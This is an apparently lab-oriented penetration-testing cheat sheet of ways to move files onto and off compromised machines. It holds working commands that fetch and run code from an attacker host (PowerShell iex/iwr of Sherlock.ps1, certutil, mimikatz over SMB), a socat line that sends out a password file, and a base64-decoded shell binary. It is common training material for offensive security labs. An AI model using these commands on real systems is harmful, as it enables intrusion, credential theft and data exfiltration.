# Transferring Files

## wget

```bash
python3 -m http.server 8000 # on kali machine
wget http://10.10.14.1:8000/linenum.sh # on target machine
```

## cURL

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh # with ssh user creds
```

## Base64

```bash
lojique@htb[/htb]$ base64 shell -w 0
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Netcat

```bash
# to receive a file
nc -nlvp 4444 > incoming.exe
# to transfer a file
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```

## Socat

```bash
# to transfer
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
# to receive
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

## PowerShell

```
# download a file
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
# loads file in memory and runs it
iex (iwr http://192.168.119.217/Sherlock.ps1 -UseBasicParsing)
```

## Powercat

```
# listener
sudo nc -lnvp 443 > receiving_powercat.ps1
# send a file
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

## Certutil

```
certutil.exe -urlcache -f http://<IP>/Sherlock.ps1 Sherlock,ps1
```

## Impacket SMB

```bash
# In directory with file
impacket-smbserver share .

# From victim
\\10.10.10.10\share\mimikatz.exe 
```
